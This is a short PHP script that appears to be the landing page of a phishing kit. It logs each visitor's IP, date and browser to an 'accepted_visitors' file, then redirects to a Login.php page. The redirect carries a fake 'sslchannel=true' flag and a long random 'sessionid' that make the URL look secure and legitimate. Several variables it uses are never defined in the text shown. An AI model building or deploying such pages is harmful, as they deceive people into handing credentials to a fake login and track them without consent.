<?php

require_once("functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'],
);
$fp = fopen("assets/logs/accepted_visitors.txt", "a");
fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
fclose($fp);
session_start();
$_SESSION['page_a_visited'] = true;
redirectTo("Login.php?sslchannel=true&sessionid=" . generateRandomString(130));

?>
